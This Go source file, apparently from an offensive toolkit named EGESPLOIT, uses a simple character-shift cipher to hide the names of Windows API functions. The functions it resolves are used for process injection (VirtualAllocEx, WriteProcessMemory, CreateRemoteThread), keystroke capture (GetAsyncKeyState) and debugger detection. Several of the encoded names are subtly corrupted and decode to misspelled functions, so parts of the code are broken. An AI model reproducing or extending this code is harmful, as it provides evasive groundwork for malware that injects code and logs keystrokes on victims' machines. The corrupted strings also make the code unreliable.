package EGESPLOIT


import "syscall"


const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010



//108 102 115 111 102 109 052 051 047 101 109 109
//118 116 102 115 052 051 047 101 109 109
//072 102 117 066 116 122 111 100 076 102 122 084 117 098 117 102
//087 106 115 117 118 098 107 066 109 109 111 100
//068 115 102 098 117 102 085 105 115 102 098 101
//088 098 106 117 071 112 115 084 106 111 104 109 102 080 099 107 102 100 117
//087 106 115 117 118 098 109 066 109 109 112 100 070 127
//068 115 102 098 117 102 083 102 110 112 117 102 085 105 115 102 098 101
//072 102 117 077 098 116 117 070 115 115 112 115
//088 115 106 117 102 081 115 112 100 102 116 116 078 102 110 112 115 122
//080 113 102 111 081 115 112 100 102 116 116
//074 116 069 102 099 118 104 104 102 115 081 115 102 116 102 111 117

func DeObfuscate(Data string) (string){
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i])-1)
	}
	return ClearText
}



var	K32 = syscall.MustLoadDLL(DeObfuscate("lfsofm43/emm"))//kernel32.dll
var USER32 = syscall.MustLoadDLL(DeObfuscate("vtfs43/emm"))//user32.dll
var GetAsyncKeyState = USER32.MustFindProc(DeObfuscate("HfuBtzodLfzTubuf"))
var VirtualAlloc = K32.MustFindProc(DeObfuscate("WjsuvbkBmmod"))
var CreateThread = K32.MustFindProc(DeObfuscate("DsfbufUisfb"))
var WaitForSingleObject = K32.MustFindProc(DeObfuscate("XbjuGpsTjohmfPckfdu"))
var VirtualAllocEx = K32.MustFindProc(DeObfuscate("WjsuvbmBmmpdF"))
var CreateRemoteThread = K32.MustFindProc(DeObfuscate("DsfbufSfnpufUisfbe"))
var GetLastError = K32.MustFindProc(DeObfuscate("HfuMbtuFssps"))
var WriteProcessMemory = K32.MustFindProc(DeObfuscate("XsjufQspdfttNfnpsz"))
var OpenProcess = K32.MustFindProc(DeObfuscate("PqfoQspdftt"))
var IsDebuggerPresent = K32.MustFindProc(DeObfuscate("JtEfcvhhfsQsftfou"))


